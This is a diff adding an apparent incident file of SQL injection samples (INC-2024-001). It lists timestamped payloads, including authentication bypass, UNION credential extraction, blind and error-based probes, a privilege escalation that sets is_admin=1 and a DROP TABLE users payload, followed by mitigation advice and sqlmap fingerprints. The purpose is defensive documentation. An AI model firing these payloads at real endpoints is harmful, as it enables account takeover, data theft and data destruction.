@@ -1,0 +1,142 @@
+===========================================
+SQL INJECTION ATTACK SAMPLES - INC-2024-001
+===========================================
+
+TIMESTAMP: 2024-11-01T14:00:05Z
+SOURCE IP: 203.0.113.45
+TARGET ENDPOINT: /api/users/search
+PAYLOAD TYPE: Classic SQL Injection
+
+PAYLOAD:
+username=admin' OR '1'='1&password=test
+
+EXPECTED SQL:
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'test'
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:00:07Z
+SOURCE IP: 198.51.100.23
+TARGET ENDPOINT: /api/data
+PAYLOAD TYPE: Union-based SQL Injection
+
+PAYLOAD:
+query=SELECT * FROM users UNION SELECT username, password FROM accounts--
+
+EXPECTED SQL:
+SELECT id, name FROM data WHERE query = 'SELECT * FROM users UNION SELECT username, password FROM accounts--'
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:02:10Z
+SOURCE IP: 203.0.113.45
+TARGET ENDPOINT: /api/users
+PAYLOAD TYPE: Time-based Blind SQL Injection
+
+PAYLOAD:
+id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+EXPECTED BEHAVIOR:
+Causes database to sleep for 5 seconds if vulnerable
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:05:22Z
+SOURCE IP: 203.0.113.45
+TARGET ENDPOINT: /api/search
+PAYLOAD TYPE: Boolean-based Blind SQL Injection
+
+PAYLOAD:
+search=test' AND (SELECT SUBSTRING((SELECT @@version),1,1))='M'--
+
+EXPECTED SQL:
+SELECT * FROM products WHERE name LIKE '%test' AND (SELECT SUBSTRING((SELECT @@version),1,1))='M'--%'
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:10:33Z
+SOURCE IP: 198.51.100.23
+TARGET ENDPOINT: /api/login
+PAYLOAD TYPE: Authentication Bypass
+
+PAYLOAD:
+username=' OR 1=1--&password=anything
+
+EXPECTED SQL:
+SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:15:44Z
+SOURCE IP: 192.0.2.67
+TARGET ENDPOINT: /api/data/export
+PAYLOAD TYPE: Database Enumeration
+
+PAYLOAD:
+format=csv' UNION SELECT table_name, column_name FROM information_schema.columns--
+
+EXPECTED SQL:
+SELECT * FROM exports WHERE format = 'csv' UNION SELECT table_name, column_name FROM information_schema.columns--'
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:20:55Z
+SOURCE IP: 203.0.113.45
+TARGET ENDPOINT: /api/admin
+PAYLOAD TYPE: Second-Order SQL Injection
+
+PAYLOAD:
+action=update&settings={'theme':'dark'}; UPDATE users SET is_admin=1 WHERE username='attacker'--
+
+EXPECTED SQL:
+UPDATE settings SET value = '{\"theme\":\"dark\"}; UPDATE users SET is_admin=1 WHERE username=\"attacker\"--' WHERE user_id = 123
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:25:01Z
+SOURCE IP: 198.51.100.23
+TARGET ENDPOINT: /api/users/delete
+PAYLOAD TYPE: Destructive SQL Injection
+
+PAYLOAD:
+id=1; DROP TABLE users;--
+
+EXPECTED SQL:
+DELETE FROM users WHERE id = 1; DROP TABLE users;--
+
+===========================================
+
+TIMESTAMP: 2024-11-01T14:28:12Z
+SOURCE IP: 192.0.2.67
+TARGET ENDPOINT: /api/config
+PAYLOAD TYPE: Error-based SQL Injection
+
+PAYLOAD:
+key=database' AND ExtractValue(1, CONCAT(0x5c, (SELECT @@version)))--
+
+EXPECTED SQL:
+SELECT value FROM config WHERE key = 'database' AND ExtractValue(1, CONCAT(0x5c, (SELECT @@version)))--'
+
+===========================================
+
+ATTACK PATTERN ANALYSIS:
+1. Multiple attack vectors used (Union, Boolean, Time-based, Error-based)
+2. Automated tool fingerprints detected (sqlmap user agents)
+3. Coordinated attack from 3 primary IP addresses
+4. Targeting user data, authentication, and database schema
+5. Attempts to escalate privileges and exfiltrate data
+
+MITIGATION RECOMMENDATIONS:
+1. Implement parameterized queries
+2. Use stored procedures
+3. Apply input validation and sanitization
+4. Set database permissions appropriately
+5. Deploy WAF with SQL injection rules
+6. Monitor for unusual database query patterns
+
+DETECTED SQLMAP FINGERPRINTS:
+- User-Agent: sqlmap/1.6#stable
+- SLEEP() function usage
+- Benchmark() function attempts
+- Information_schema queries
+- UNION SELECT with NULL columns
